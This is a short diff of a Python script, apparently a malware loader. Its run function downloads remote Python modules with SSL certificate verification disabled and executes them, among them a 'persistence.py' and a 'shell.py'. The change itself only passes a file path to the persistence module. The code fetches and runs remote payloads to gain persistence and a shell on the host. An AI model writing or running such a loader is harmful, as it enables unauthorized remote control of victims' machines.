@@ -7,7 +7,7 @@ import sys
 
 #check to see if the scirpt is already Rolling
 
-def run(url):
+def run(url, file_path):
   # download python code
   def create_moduel(url):
     # Create an SSL context that doesn't verify certificates
@@ -32,7 +32,7 @@ def run(url):
   data = module.run(url) # works fine the shell part gives errors
   
   module = create_moduel(f"{url}persistence.py")
-  module.run(url)
+  module.run(url, file_path)
   
   module = create_moduel(f"{url}shell.py")
   
